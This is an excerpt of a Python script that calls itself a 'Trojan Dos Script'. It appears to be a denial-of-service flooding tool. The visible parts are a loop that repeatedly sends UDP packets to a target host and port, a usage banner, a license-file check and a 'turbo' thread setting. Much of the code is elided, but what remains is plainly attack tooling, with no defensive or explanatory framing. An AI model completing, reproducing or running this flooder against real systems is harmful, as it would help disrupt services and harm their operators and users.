	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[0m \033[1;0;99m vbs sent! \033[1;96;99m<thanks Si7 project>  \033[0m")
			else:
				s.shutdown(1)
...
def usage():
	print (''' \033[36m	Trojan Dos Script v.1 http://www.canyalcin.com/
...
if __name__ == '__main__':
	...
	get_parameters()
	try:
		ksk = open('LISENSI.txt','r').read()
	except IOError:
		print("\033[31;99mCRITICAL \033[0;99m: license not found!")
		sys.exit()
		
	print("\033[0m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
